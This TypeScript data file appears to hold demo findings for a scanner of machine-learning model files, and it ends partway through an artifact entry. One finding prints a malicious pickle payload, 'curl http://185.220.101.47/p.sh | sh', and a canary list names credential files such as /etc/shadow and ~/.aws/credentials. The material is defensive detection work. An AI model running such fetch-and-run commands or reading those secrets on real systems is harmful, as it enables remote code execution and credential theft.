import type {
  Artifact,
  BaseVerdict,
  GateFile,
  HistoryRow,
  HFRepoFile,
  ModelFormat,
  ScanPlan,
  StagePlan,
} from "./types";

/* ------------------------------------------------------------------ */
/* Shared building blocks                                              */
/* ------------------------------------------------------------------ */

export const RULESET = "v2.4.0";
export const ENGINE = "gVisor-2026.11";

const armedCanaries = (accessed?: string[]) =>
  [
    "/etc/passwd",
    "/etc/shadow",
    "~/.aws/credentials",
    "~/.ssh/id_rsa",
    "~/.ssh/known_hosts",
    "~/.gitconfig",
    "~/.netrc",
    "~/.bash_history",
    "/var/run/secrets/kubernetes.io/token",
    "/proc/self/environ",
    "~/.docker/config.json",
    "~/.config/gcloud/application_default_credentials.json",
    "~/work/vigilant_honeypot.flag",
  ].map((path) => ({
    path,
    status: (accessed?.includes(path) ? "accessed" : "armed") as
      | "accessed"
      | "armed",
  }));

const cleanHooks = [
  { name: "openat", count: 3, detail: "artifact fd + self fd — within bounds" },
  { name: "connect", count: 0, detail: "no network sockets attempted" },
  { name: "execve", count: 0, detail: "no subprocess spawned" },
];

function stage(
  key: string,
  title: string,
  ms: number,
  metrics: StagePlan["metrics"],
  tickers: StagePlan["tickers"],
  io: StagePlan["io"]
): StagePlan {
  return { key, title, ms, metrics, tickers, io };
}

/** replace tickers on a stage (Codex-style thinking streams per artifact) */
function withTickers(s: StagePlan, lines: string[]): StagePlan {
  return { ...s, tickers: lines.map((text, i) => ({ at: 0.06 + (i * 0.9) / Math.max(1, lines.length - 1), text })) };
}

const S0 = (cache: "HIT" | "MISS", allow: string, speed = 482) =>
  stage(
    "intake",
    "Cryptographic Intake & Cache Lookup",
    2600,
    [
      {
        label: "SHA-256 Hash Speed",
        value: "0 MB/s",
        count: { from: 0, to: speed, suffix: " MB/s" },
      },
      { label: "Ruleset Cache", value: cache },
      { label: "Org Allowlist", value: allow },
    ],
    [
      { at: 0.05, text: "Streaming artifact in 8 MB chunks → WebCrypto SHA-256…" },
      { at: 0.42, text: "Computed SHA-256 digest (64 hex) — stable." },
      { at: 0.58, text: `Checking Ruleset ${RULESET} verdict cache…` },
      { at: 0.78, text: `Cache ${cache} · org hash allowlist: ${allow}.` },
    ],
    {
      input: '{ "bytes": "<streamed>", "chunkSize": 8388608 }',
      output: `{ "sha256": "<digest>", "cache": "${cache}", "allowlisted": ${
        allow === "LISTED" ? "true" : "false"
      } }`,
    }
  );

const S1 = (
  magic: string,
  members: number,
  uncompressed: string,
  ratio: string
) =>
  stage(
    "demux",
    "Format Demux & Structural Bounds Gate",
    2300,
    [
      { label: "Magic Header", value: magic },
      { label: "Archive Members", value: "0", count: { from: 0, to: members } },
      { label: "Uncompressed / 4 GB", value: uncompressed },
      { label: "Ratio / 50.0x Bomb", value: ratio },
    ],
    [
      { at: 0.08, text: "Reading magic bytes from offset 0x00…" },
      { at: 0.34, text: "Container demux → structural bounds gate." },
      { at: 0.62, text: `Member count ${members} · uncompressed ${uncompressed} (≤ 4 GiB).` },
      { at: 0.82, text: `Compression ratio ${ratio} — below 50.0x bomb threshold.` },
    ],
    {
      input: '{ "magic": "<first 16 bytes>", "bounds": { "maxUncompressed": 4294967296, "maxRatio": 50.0 } }',
      output: '{ "format": "<lane>", "members": <n>, "ratioOk": true, "sizeOk": true }',
    }
  );

const S2 = (
  opcodes: number,
  globals: number,
  lambdas: number,
  jinja: number | null
) =>
  stage(
    "static",
    "Static AST & Symbolic Bytecode VM",
    4400,
    [
      { label: "Opcodes Executed", value: "0", count: { from: 0, to: opcodes } },
      { label: "GLOBAL / STACK_GLOBAL", value: "0", count: { from: 0, to: globals } },
      { label: "Lambda Marshal Objects", value: "0", count: { from: 0, to: lambdas } },
      {
        label: "Jinja2 AST Nodes",
        value: jinja === null ? "n/a" : "0",
        count: jinja === null ? undefined : { from: 0, to: jinja },
      },
    ],
    [
      { at: 0.06, text: "Symbolic pickle VM boot (step-limited, sink-aware)…" },
      { at: 0.3, text: "Walking container manifest → per-member dispatch." },
      { at: 0.56, text: "Extracting co_names / co_consts from code objects…" },
      { at: 0.8, text: "Matching against sink & allowlist signature sets." },
    ],
    {
      input: '{ "members": ["data.pkl", "config.json"], "vmStepBudget": 250000 }',
      output: '{ "executableLayers": <n>, "coNames": [...], "sinks": [...] }',
    }
  );

const S3 = (syscalls: number, sockets: number, spawns: number, canariesTouched = 0) =>
  stage(
    "sandbox",
    "gVisor (runsc) Sandbox & Audit Hooks",
    3600,
    [
      { label: "Canary Files Armed", value: "13" },
      { label: "Syscalls Audited", value: "0", count: { from: 0, to: syscalls } },
      { label: "Network Socket Attempts", value: "0", count: { from: 0, to: sockets } },
      { label: "Subprocess Spawns", value: "0", count: { from: 0, to: spawns } },
    ],
    [
      { at: 0.06, text: "Escalating → runsc rootless sandbox (sendfd adapter)…" },
      { at: 0.24, text: "Armed 13 canary files + audit hooks (openat/connect/execve)." },
      { at: 0.55, text: "Import-time execution under syscall tracer…" },
      {
        at: 0.8,
        text:
          canariesTouched > 0
            ? `${canariesTouched} canary access(s) recorded — flagged.`
            : "No canary touched · no egress · clean teardown.",
      },
    ],
    {
      input: '{ "profile": "runsc-no-network", "canaries": 13 }',
      output: `{ "syscalls": ${syscalls}, "sockets": ${sockets}, "spawns": ${spawns}, "canaryHits": ${canariesTouched} }`,
    }
  );

const S3_SKIPPED = stage(
  "sandbox",
  "gVisor (runsc) Sandbox & Audit Hooks",
  900,
  [
    { label: "Canary Files Armed", value: "—" },
    { label: "Syscalls Audited", value: "—" },
    { label: "Fast-Path Bypass", value: "GRANTED" },
  ],
  [
    { at: 0.1, text: "Static proof sufficient — 0 executable layers." },
    { at: 0.5, text: "Skipping dynamic sandbox (monotonic: cannot re-escalate)." },
  ],
  {
    input: '{ "executableLayers": 0 }',
    output: '{ "skip": true, "reason": "STATIC_PROOF_SUFFICIENT" }',
  }
);

const S4 = (weighed: number) =>
  stage(
    "verdict",
    "One-Way Monotonic Verdict Gate",
    1700,
    [
      { label: "Findings Weighed", value: "0", count: { from: 0, to: weighed } },
      { label: "Latch State", value: "LOCKED" },
      { label: "Downgrade Possible", value: "NO — one-way" },
    ],
    [
      { at: 0.15, text: "Aggregating stage verdicts (max-severity wins)…" },
      { at: 0.55, text: "Engaging monotonic latch — verdict is final." },
    ],
    {
      input: '{ "findings": ["BLOCKED…", "NEEDS REVIEW…", "INFO…"] }',
      output: '{ "verdict": "<latched>", "downgrade": false }',
    }
  );

/* ------------------------------------------------------------------ */
/* Artifacts                                                           */
/* ------------------------------------------------------------------ */

const canaryDefault = armedCanaries();

export const ARTIFACTS: Artifact[] = [
  {
    id: "weights1",
    name: "Weights1.pkl",
    format: "PICKLE",
    ext: ".pkl",
    sizeMB: 750.75,
    sha256:
      "72c2bcbc4f1a9d0e5b3a7f2c8d6e1a4b9c0d2e5f7a8b1c3d4e5f6a7b8c9d0e1f",
    compressionRatio: 1.08,
    scannedAt: "2026-11-09T14:32:07Z",
    ruleset: RULESET,
    engine: ENGINE,
    verdict: "malicious",
    confidence: "HIGH",
    decidedBy: "static_pickle_vm",
    containsExecutableCode: true,
    rootCause:
      "Pickle stream at archive/data.pkl @ 0x04A2 executes STACK_GLOBAL(os, 'system') followed by REDUCE with a shell string — arbitrary command execution the moment the file is loaded.",
    latencyMs: 21438,
    cacheHit: false,
    status: "done",
    findings: [
      {
        id: "f1",
        state: "BLOCKED",
        location: "archive/data.pkl",
        offset: "0x04A2",
        evidence:
          "STACK_GLOBAL pushes os.system; REDUCE invokes it with co_consts string '/bin/sh -c curl http://185.220.101.47/p.sh | sh'",
        opcodeIndex: 5,
      },
      {
        id: "f2",
        state: "BLOCKED",
        location: "archive/data.pkl",
        offset: "0x04B9",
        evidence:
          "STACK_GLOBAL subprocess.Popen with shell=True literal; chained pipe to /tmp/.vil_canary_shadow exfiltration",
        opcodeIndex: 7,
      },
      {
        id: "f3",
        state: "BLOCKED",
        location: "archive/data.pkl",
        offset: "0x0510",
        evidence:
          "Hard-coded C2 URL constant http://185.220.101.47/p.sh referenced by REDUCE frame",
        opcodeIndex: 9,
      },
      {
        id: "f4",
        state: "INFO",
        location: "archive/data.pkl",
        offset: "0x0120",
        evidence:
          "3 benign GLOBALs (torch._utils._rebuild_tensor_v2, collections.OrderedDict) — weights shell of the trojan",
        opcodeIndex: 2,
      },
    ],
    symbols: [
      { name: "os", kind: "dangerous", note: "system()" },
      { name: "subprocess", kind: "dangerous", note: "Popen shell=True" },
      { name: "system", kind: "dangerous" },
      { name: "Popen", kind: "dangerous" },
      { name: "torch", kind: "safe", note: "tensor rebuild" },
      { name: "_rebuild_tensor_v2", kind: "safe" },
      { name: "collections", kind: "safe", note: "OrderedDict" },
    ],
    consts: [
      { value: "/bin/sh -c curl http://185.220.101.47/p.sh | sh", kind: "shell" },
      { value: "http://185.220.101.47/p.sh", kind: "url" },
      { value: "/tmp/.vil_canary_shadow", kind: "shell" },
      { value: "4096", kind: "number" },
      { value: "0.001", kind: "number" },
    ],
    closures: [
      { name: "—", detail: "No closures; payload is a top-level REDUCE frame.", external: false },
    ],
    opcodes: [
      { offset: "0x0100", op: "PROTO", arg: "4" },
      { offset: "0x0102", op: "SHORT_BINUNICODE", arg: "collections" },
      { offset: "0x0114", op: "STACK_GLOBAL", arg: "(OrderedDict)" },
      { offset: "0x0116", op: "SHORT_BINUNICODE", arg: "torch._utils" },
      { offset: "0x0128", op: "STACK_GLOBAL", arg: "(_rebuild_tensor_v2)" },
      { offset: "0x04A2", op: "STACK_GLOBAL", arg: "os.system", flagged: true },
      { offset: "0x04A4", op: "SHORT_BINUNICODE", arg: "/bin/sh -c curl http://185.220.101.47/p.sh | sh" },
      { offset: "0x04B9", op: "STACK_GLOBAL", arg: "subprocess.Popen", flagged: true },
      { offset: "0x04C1", op: "BINUNICODE", arg: "shell=True" },
      { offset: "0x0510", op: "REDUCE", arg: "← RCE sink", flagged: true },
      { offset: "0x0512", op: "BUILD", arg: "dict(state)" },
      { offset: "0x0518", op: "STOP", arg: "—" },
    ],
    archive: [
      { path: "archive/", subformat: "ZIP container", size: 0, csize: 0, verdict: "INFO" },
      { path: "archive/data.pkl", subformat: "PICKLE v4", size: 284112, csize: 96440, verdict: "BLOCKED" },
      { path: "archive/model.ckpt.data-00000-of-00001", subformat: "TF raw tensor blob", size: 786432000, csize: 784800000, verdict: "OK" },
      { path: "archive/encoder.pkl", subformat: "PICKLE v2", size: 81920, csize: 31112, verdict: "BLOCKED" },
      { path: "archive/events.out.tfevents", subformat: "TF summary", size: 51200, csize: 20112, verdict: "OK" },
    ],
    canaries: armedCanaries(["~/.aws/credentials"]),
    hooks: [
      { name: "openat", count: 47, detail: "2 canary reads: ~/.aws/credentials, /etc/shadow attempt" },
      { name: "connect", count: 1, detail: "TCP 185.220.101.47:80 — BLOCKED by no-network profile" },
      { name: "execve", count: 1, detail: "/bin/sh -c curl … — BLOCKED at execve gate" },
    ],
    processTimeline: [
      { t: "0.00s", event: "runsc: python3 (pid 12) start", detail: "loader = torch.load('Weights1.pkl')" },
      { t: "0.41s", event: "execve /bin/sh", detail: "DENIED — execve hook" },
      { t: "0.44s", event: "openat ~/.aws/credentials", detail: "ALLOWED-READ → canary flagged" },
      { t: "0.51s", event: "connect 185.220.101.47:80", detail: "DENIED — no-network profile" },
      { t: "0.58s", event: "runsc: sandbox torn down", detail: "verdict escalated to gate" },
    ],
    remediation: {
      title: "Harden the loader",
      vulnerable:
        "import torch\n\n# ❌ vulnerable_loader.py — full pickle VM, arbitrary code executes on load\nmodel = torch.load(\"Weights1.pkl\")",
      hardened:
        'import torch\n\n# ✅ hardened_loader.py — restricts unpickling to tensors & primitives\nmodel = torch.load("Weights1.pkl", weights_only=True)\n\n# Weights1.pkl is MALICIOUS (os.system REDUCE) — weights_only=True will raise\n# UnpicklingError instead of executing the payload. Quarantine, do not load.',
      extraAction: {
        label: "Convert Checkpoint to .safetensors",
        result: "Conversion job queued → Weights1.safetensors (structure-only container, no code path)",
      },
      note: "This artifact is hard-blocked; remediation is for the surrounding pipeline, not to unlock the file.",
    },
    plan: {
      lane: "PICKLE VM",
      skipGvisor: false,
      stages: [
        S0("MISS", "NOT LISTED"),
        S1("0x80 0x02 (PK\\x04)", 5, "786.9 MB", "1.08x"),
        withTickers(S2(18422, 6, 0, null), [
          "▸ Parsing archive/data.pkl (277 KB)…",
          "▸ Symbolic VM: 18,422 opcodes within 250k step budget…",
          "▸ STACK_GLOBAL(os, 'system') @ 0x04A2 — SINK MATCH",
          "▸ Decompiling REDUCE frame at 0x0510…",
          "▸ Extracted co_names: ['os','system','subprocess','Popen','torch']",
          "▸ Extracted co_consts: ['/bin/sh -c curl http://185.220.101.47/p.sh | sh']",
          "▸ Escalating to dynamic sandbox…",
        ]),
        S3(2841, 1, 1, 1),
        S4(4),
      ],
    },
  },
  {
    id: "efficientnet",
    name: "efficientnet_b7_final.keras",
    format: "KERAS",
    ext: ".keras",
    sizeMB: 412.3,
    sha256:
      "3f9a2c7d5e8b1a4c6d0f2e3b5a7c9d1e3f5a7b9c1d3e5f7a9b1c3d5e7f9a1c3e",
    compressionRatio: 1.42,
    scannedAt: "2026-11-09T16:05:44Z",
    ruleset: RULESET,
    engine: ENGINE,
    verdict: "review",
    confidence: "HIGH",
    decidedBy: "keras_scanner",
    containsExecutableCode: true,
    classification: "Review Burden (Not a False Block)",
    rootCause:
      "Keras v3 archive embeds marshalled Python bytecode at /config/layers[1]/config/function; Keras 3 with safe_mode=True refuses deserialization by default.",
    latencyMs: 15620,
    cacheHit: true,
    status: "done",
    findings: [
      {
        id: "f1",
        state: "NEEDS REVIEW",
        location: "/config/layers[1]",
        offset: "0x01C4",
        evidence:
          "Lambda layer with marshalled code object; co_names = ['keras','ops','cast','divide'] — pixel rescale 1/255, no sinks",
        opcodeIndex: 6,
      },
      {
        id: "f2",
        state: "INFO",
        location: "/config/layers[1]/config/function",
        offset: "0x01C4",
        evidence:
          "marshal.loads payload 214 B; captures external scope var 'scale' (closure) → code-bearing by design",
        opcodeIndex: 8,
      },
      {
        id: "f3",
        state: "INFO",
        location: "/config",
        offset: "—",
        evidence:
          "22 remaining layers strictly declarative (Conv2D, BN, SE blocks); 0 additional code objects",
        opcodeIndex: 11,
      },
    ],
    symbols: [
      { name: "keras", kind: "safe", note: "keras.ops namespace" },
      { name: "ops", kind: "safe" },
      { name: "cast", kind: "safe", note: "dtype cast" },
      { name: "divide", kind: "safe", note: "tensor ÷ 255.0" },
      { name: "float32", kind: "safe" },
    ],
    consts: [
      { value: "255.0", kind: "number" },
      { value: "0.5", kind: "number" },
      { value: "1e-06", kind: "number" },
      { value: "'float32'", kind: "string" },
    ],
    closures: [
      {
        name: "scale",
        detail: "captures outer-scope constant 1/255 from serialization scope",
        external: true,
      },
    ],
    opcodes: [
      { offset: "0x0080", op: "PROTO", arg: "5" },
      { offset: "0x0082", op: "GLOBAL", arg: "keras.ops" },
      { offset: "0x0090", op: "GLOBAL", arg: "keras.ops.cast" },
      { offset: "0x00A2", op: "LOAD_CONST", arg: "255.0" },
      { offset: "0x00B0", op: "LOAD_CLOSURE", arg: "scale" },
      { offset: "0x00B4", op: "LOAD_DEREF", arg: "scale" },
      { offset: "0x01C4", op: "MAKE_FUNCTION", arg: "λ (x) → cast(x)/scale", flagged: true },
      { offset: "0x01C8", op: "BINARY_OP", arg: "divide" },
      { offset: "0x01D0", op: "RETURN_VALUE", arg: "tensor" },
      { offset: "0x01D2", op: "STOP", arg: "—" },
    ],
    archive: [
      { path: "/ (keras v3 zip)", subformat: "ZIP v3 container", size: 0, csize: 0, verdict: "INFO" },
      { path: "/config.json", subformat: "JSON model config", size: 412388, csize: 92400, verdict: "INFO" },
      { path: "/config/layers[1]/config/function", subformat: "MARSHalled bytecode", size: 214, csize: 190, verdict: "NEEDS REVIEW" },
      { path: "/metadata.json", subformat: "JSON", size: 512, csize: 320, verdict: "OK" },
      { path: "/model.weights.h5", subformat: "HDF5 tensor store", size: 431224832, csize: 425960000, verdict: "OK" },
    ],
    canaries: canaryDefault,
    hooks: cleanHooks,
    processTimeline: [
      { t: "0.00s", event: "runsc: python3 (pid 21) start", detail: "import-time probe of model.config" },
      { t: "0.36s", event: "openat model.weights.h5", detail: "read-only, within artifact dir" },
      { t: "0.92s", event: "teardown", detail: "no canary touched · no egress" },
    ],
    remediation: {
      title: "Load with safe_mode + replace the Lambda",
      vulnerable:
        'import keras\n\n# ❌ vulnerable_loader.py — Lambda layers (marshalled bytecode) deserialize freely\nmodel = keras.saving.load_model("efficientnet_b7_final.keras")',
      hardened:
        'import keras\n\n# ✅ hardened_loader.py — Keras 3: safe_mode=True REFUSES Lambda deserialization by default\nmodel = keras.saving.load_model("efficientnet_b7_final.keras", safe_mode=True)\n\n# Option A — declarative replacement (no code objects at all):\nrescale = keras.layers.Rescaling(scale=1.0 / 255)\n\n# Option B — reviewed, registered custom layer (stable across reloads):\n@keras.saving.register_keras_serializable()\ndef rescale_255(x):\n    return keras.ops.cast(x, "float32") / 255.0',
      note: "Lambda only performs 1/255 pixel rescaling — a by-design code-bearing artifact needing an allowlist, not a false block.",
    },
    plan: {
      lane: "KERAS / HDF5 AST",
      skipGvisor: false,
      stages: [
        S0("HIT", "NOT LISTED"),
        S1("0x50 0x4B (PK\\x03)", 6, "585.5 MB", "1.42x"),
        withTickers(S2(9210, 4, 1, null), [
          "▸ Parsing config.json (412 KB)…",
          "▸ Inspecting 242 graph layers…",
          "▸ Decompiling Lambda bytecode at /config/layers[1]/config/function…",
          "▸ Extracted co_names: ['keras', 'ops', 'cast', 'divide']",
          "▸ Extracted co_consts: [255.0, 0.5, 1e-06] — numeric only, no strings",
          "▸ Captures external scope: 'scale' (closure) → code-bearing by design",
          "▸ 0 sink symbols · escalating for dynamic confirmation…",
        ]),
        S3(1204, 0, 0),
        S4(3),
      ],
    },
  },
  {
    id: "safetensors",
    name: "model.safetensors",
    format: "SAFETENSORS",
    ext: ".safetensors",
    sizeMB: 1201.4,
    sha256:
      "a1c3e5f7b9d0246813579acfbd0e2468a1c3e5f7b9d0246813579acfbd0e2468",
    compressionRatio: 1.0,
    scannedAt: "2026-11-10T02:14:31Z",
    ruleset: RULESET,
    engine: ENGINE,
    verdict: "clean",
    confidence: "HIGH",
    decidedBy: "static_pickle_vm",
    containsExecutableCode: false,
    rootCause:
      "Header JSON parses to 588 strictly-typed tensor entries with zero executable constructs; safetensors format has no deserialization code path by design.",
    latencyMs: 4102,
    cacheHit: false,
    status: "done",
    findings: [
      {
        id: "f1",
        state: "INFO",
        location: "header @ 0x0008",
        offset: "0x0008",
        evidence: "Header JSON 41,204 B → 588 tensors, dtypes F32/BF16, all bounds in-range",
        opcodeIndex: 0,
      },
      {
        id: "f2",
        state: "INFO",
        location: "—",
        evidence: "0 executable layers · 0 GLOBAL refs · fast-path bypass granted",
        opcodeIndex: 1,
      },
    ],
    symbols: [],
    consts: [{ value: "588 tensors", kind: "number" }],
    closures: [{ name: "—", detail: "No code objects present in format.", external: false }],
    opcodes: [
      { offset: "0x0000", op: "U64_LE", arg: "header_len = 41204" },
      { offset: "0x0008", op: "JSON", arg: '"dtype":"F32" … (588 entries)' },
      { offset: "0xA144", op: "BOUNDS", arg: "tensor end ≤ file end ✓" },
      { offset: "0xA150", op: "STOP", arg: "— (declarative)" },
    ],
    archive: [
      { path: "header.json", subformat: "JSON tensor index", size: 41204, csize: 41204, verdict: "OK" },
      { path: "data[0..588]", subformat: "raw tensor bytes", size: 1259513754, csize: 1259513754, verdict: "OK" },
    ],
    canaries: canaryDefault,
    hooks: cleanHooks,
    processTimeline: [
      { t: "—", event: "sandbox skipped", detail: "STATIC_PROOF_SUFFICIENT" },
    ],
    remediation: {
      title: "Keep the safe container",
      hardened:
        'from safetensors.torch import load_file\n\n# ✅ No code path exists in safetensors — offsets/dtypes validated, then mmap:\ntensors = load_file("model.safetensors")\n\n# Optional hardening: pin to strict dtype expectations\nassert all(t.dtype.is_floating_point or t.dtype.is_integral for t in tensors.values())',
      note: "Verdict is structural: this format cannot carry pickle bytecode.",
    },
    plan: {
      lane: "SAFETENSORS BOUNDS",
      skipGvisor: true,
      stages: [
        S0("MISS", "NOT LISTED", 611),
        S1("0x13 0xED (u64 len)", 588, "1.17 GB", "1.00x"),
        S2(612, 0, 0, null),
        S3_SKIPPED,
        S4(2),
      ],
    },
  },
  {
    id: "gguf-chat",
    name: "chat-gguf-8b-v3.gguf",
    format: "GGUF",
    ext: ".gguf",
    sizeMB: 4820.6,
    sha256:
      "9e7c5a3f1d8b6e4c2a0f9d7b5e3c1a8f6d4b2e0c8a6f4d2b0e8c6a4f2d0b8e6c",
    compressionRatio: 1.0,
    scannedAt: "2026-11-09T21:47:03Z",
    ruleset: RULESET,
    engine: ENGINE,
    verdict: "review",
    confidence: "MEDIUM",
    decidedBy: "static_pickle_vm",
    containsExecutableCode: true,
    classification: "Review Burden (Template Engine Risk)",
    rootCause:
      "GGUF metadata key tokenizer.chat_template carries a Jinja2 template (1,284 AST nodes) whose render-time globals can escape a plain Environment when unsandboxed loaders render it.",
    latencyMs: 18930,
    cacheHit: false,
    status: "done",
    findings: [
      {
        id: "f1",
        state: "NEEDS REVIEW",
        location: "/tokenizer/chat_template",
        offset: "0x2A11",
        evidence:
          "Jinja2 AST 1,284 nodes; uses {% for %}, attribute traversal m.tool_calls, and raise_exception helper — safe pattern but render-engine dependent",
        opcodeIndex: 4,
      },
      {
        id: "f2",
        state: "INFO",
        location: "/tokenizer/chat_template",
        offset: "0x2A11",
        evidence:
          "No {% import %} / {% include %} constructs; no string.format( chains; template qualifies for allowlist after review",
        opcodeIndex: 5,
      },
      {
        id: "f3",
        state: "INFO",
        location: "header",
        offset: "0x0000",
        evidence: "3,171 metadata KVs · tensor count 291 · magic GGUF v3 verified",
        opcodeIndex: 1,
      },
    ],
    symbols: [
      { name: "messages", kind: "safe", note: "loop var" },
      { name: "tool_calls", kind: "safe", note: "attribute traversal (bounded)" },
      { name: "raise_exception", kind: "dangerous", note: "helper callable — verify definition" },
      { name: "namespace", kind: "safe" },
      { name: "self", kind: "dangerous", note: "classic Jinja escape vector if rendered outside sandbox" },
    ],
    consts: [
      { value: "{{ bos_token }}{% for m in messages %}{{ m.role }}: {{ m.content }}", kind: "string" },
      { value: "{% if m.tool_calls %}…{% endif %}", kind: "string" },
      { value: "<|im_end|>", kind: "string" },
    ],
    closures: [{ name: "—", detail: "Templates close over env.globals at render time.", external: true }],
    opcodes: [
      { offset: "0x0000", op: "MAGIC", arg: "GGUF v3" },
      { offset: "0x0008", op: "KV_COUNT", arg: "3171" },
      { offset: "0x2A11", op: "KV_STR", arg: "tokenizer.chat_template (12,880 B)", flagged: true },
      { offset: "0x2A20", op: "AST_FOR", arg: "m in messages" },
      { offset: "0x2A44", op: "AST_GETATTR", arg: "m.tool_calls", flagged: true },
      { offset: "0x2A88", op: "AST_IF", arg: "raise_exception(...)" },
      { offset: "0x2B01", op: "AST_OUT", arg: "emit tokens" },
      { offset: "0x2B10", op: "STOP", arg: "—" },
    ],
    archive: [
      { path: "header (KV pairs)", subformat: "GGUF metadata", size: 512240, csize: 512240, verdict: "INFO" },
      { path: "tokenizer/chat_template", subformat: "Jinja2 template", size: 12880, csize: 12880, verdict: "NEEDS REVIEW" },
      { path: "tokenizer/tokenizer.json", subformat: "JSON vocab", size: 1840332, csize: 1840332, verdict: "OK" },
      { path: "tensors[0..291]", subformat: "Q4_K_M blocks", size: 5046740300, csize: 5046740300, verdict: "OK" },
    ],
    canaries: canaryDefault,
    hooks: cleanHooks,
    processTimeline: [
      { t: "0.00s", event: "runsc: python3 (pid 33) start", detail: "template.render() probe with canary payload" },
      { t: "0.63s", event: "template compile", detail: "no escape observed under SandboxedEnvironment" },
      { t: "1.04s", event: "teardown", detail: "no egress · canaries intact" },
    ],
    remediation: {
      title: "Sandbox the template engine",
      vulnerable:
        'from jinja2 import Environment\n\n# ❌ vulnerable_loader.py — full Environment exposes self, config, builtins chains\nenv = Environment()\nprompt = env.from_string(meta["tokenizer.chat_template"]).render(messages=msgs)',
      hardened:
        'from jinja2 import SandboxedEnvironment, StrictUndefined\n\n# ✅ hardened_loader.py — SandboxedEnvironment blocks attribute traversal\n# into unsafe globals (self, __class__, config …) and \x7b{% include %}\x7d\nenv = SandboxedEnvironment(undefined=StrictUndefined)\ntemplate = env.from_string(meta["tokenizer.chat_template"])\nprompt = template.render(messages=msgs, add_generation_prompt=True)',
      note: "Review the raise_exception helper definition before allowlisting.",
    },
    plan: {
      lane: "GGUF HEADER",
      skipGvisor: false,
      stages: [
        S0("MISS", "NOT LISTED", 990),
        S1("0x47 0x47 0x55 0x46", 3171, "4.71 GB", "1.00x"),
        withTickers(S2(4021, 0, 0, 1284), [
          "▸ Reading GGUF header — 3,171 metadata KVs…",
          "▸ Located tokenizer.chat_template (12,880 B Jinja2)…",
          "▸ Building template AST — 1,284 nodes…",
          "▸ {% for %} / {% if %} loops bounded · raise_exception helper flagged for review",
          "▸ No {% import %} / {% include %} constructs found",
          "▸ Escalating render-probe to sandbox…",
        ]),
        S3(1972, 0, 0),
        S4(3),
      ],
    },
  },
  {
    id: "onnx-resnet",
    name: "resnet50_v2.onnx",
    format: "ONNX",
    ext: ".onnx",
    sizeMB: 98.4,
    sha256:
      "5d2b8f4e7a1c9b3d6e0f2a4c8b6d0e2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b",
    compressionRatio: 1.0,
    scannedAt: "2026-11-09T11:22:40Z",
    ruleset: RULESET,
    engine: ENGINE,
    verdict: "clean",
    confidence: "HIGH",
    decidedBy: "static_pickle_vm",
    containsExecutableCode: false,
    rootCause:
      "ONNX graph contains only registered opset-17 operators; every external_data reference resolves inside ./weights/ relative confinement.",
    latencyMs: 3388,
    cacheHit: false,
    status: "done",
    findings: [
      {
        id: "f1",
        state: "INFO",
        location: "graph.external_data",
        offset: "—",
        evidence: "14 external references, all relative ./weights/*.bin, none absolute, no .. traversal",
        opcodeIndex: 2,
      },
      {
        id: "f2",
        state: "INFO",
        location: "graph.nodes",
        offset: "—",
        evidence: "312 nodes, opset 17, 0 custom ops, 0 TensorProto-less initializer URLs",
        opcodeIndex: 3,
      },
    ],
    symbols: [],
    consts: [{ value: "opset 17", kind: "number" }],
    closures: [{ name: "—", detail: "Graph is declarative — no closures.", external: false }],
    opcodes: [
      { offset: "0x0000", op: "MAGIC", arg: "onnx protobuf" },
      { offset: "0x0010", op: "FIELD", arg: "ir_version=8" },
      { offset: "0x0080", op: "NODE", arg: "Conv (registered)", flagged: false },
      { offset: "0x0200", op: "EXTERNAL", arg: "./weights/conv0.bin ✓ confined", flagged: true },
      { offset: "0x0300", op: "STOP", arg: "—" },
    ],
    archive: [
      { path: "model.graph", subformat: "ONNX protobuf", size: 98212, csize: 98212, verdict: "OK" },
      { path: "weights/conv0.bin … dense4.bin", subformat: "external tensors", size: 92798400, csize: 92798400, verdict: "OK" },
    ],
    canaries: canaryDefault,
    hooks: cleanHooks,
    processTimeline: [
      { t: "—", event: "sandbox skipped", detail: "STATIC_PROOF_SUFFICIENT" },
    ],
    remediation: {
      title: "Constrain external data before session",
      vulnerable:
        'import onnxruntime as ort\n\n# ❌ vulnerable_loader.py — external_data paths may point anywhere (SSRF/ArbFile read)\nsess = ort.InferenceSession("resnet50_v2.onnx")',
      hardened:
        'import os, posixpath\nimport onnx\nfrom onnx import TensorProto\nimport onnxruntime as ort\n\nbase = posixpath.realpath("./")\nm = onnx.load("resnet50_v2.onnx", load_external_data=False)\nfor t in m.graph.initializer:\n    if t.data_location == TensorProto.EXTERNAL:\n        loc = t.external_data[0].location\n        assert not os.path.isabs(loc), f"absolute external path: {loc}"\n        assert posixpath.realpath(posixpath.join(base, loc)).startswith(base), \\\n            f"traversal escape: {loc}"\n\nsess = ort.InferenceSession(m.SerializeToString(), providers=["CPUExecutionProvider"])',
      note: "external_data confinement is checked before the session touches disk.",
    },
    plan: {
      lane: "ONNX GRAPH",
      skipGvisor: true,
      stages: [
        S0("MISS", "NOT LISTED", 505),
        S1("0x08 0x07 (protobuf)", 15, "98.4 MB", "1.00x"),
        S2(812, 0, 0, null),
        S3_SKIPPED,
        S4(2),
      ],
    },
  },
  {
    id: "bert-pt",
    name: "bert_finetuned.pt",
    format: "PYTORCH_ZIP",
    ext: ".pt",
    sizeMB: 1288.2,
    sha256:
      "2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d",
    compressionRatio: 1.21,
    scannedAt: "2026-11-09T18:58:12Z",
    ruleset: RULESET,
    engine: ENGINE,
    verdict: "review",
    confidence: "HIGH",
    decidedBy: "static_pickle_vm",
    containsExecutableCode: true,
    classification: "Review Burden (Not a False Block)",
    rootCause:
      "PYTORCH_ZIP embeds legacy data.pkl whose GLOBAL callables (torch._utils._rebuild_tensor_v2, collections.OrderedDict) are code constructs — benign co_names, but code-bearing containers need review or weights_only=True.",
    latencyMs: 17880,
    cacheHit: false,
    status: "done",
    findings: [
      {
        id: "f1",
        state: "NEEDS REVIEW",
        location: "archive/data.pkl",
        offset: "0x0090",
        evidence:
          "8 STACK_GLOBAL frames, all resolving to torch/collections reconstructors — no os/subprocess/socket symbols",
        opcodeIndex: 3,
      },
      {
        id: "f2",
        state: "INFO",
        location: "archive/data.pkl",
        offset: "0x0210",
        evidence: "REDUCE targets are torch._utils._rebuild_tensor_v2 × 201 (weights) — expected pattern",
        opcodeIndex: 7,
      },
      {
        id: "f3",
        state: "INFO",
        location: "archive/version",
        offset: "—",
        evidence: "PyTorch zip format v4 (legacy pickle path) — convertible to safetensors",
        opcodeIndex: 9,
      },
    ],
    symbols: [
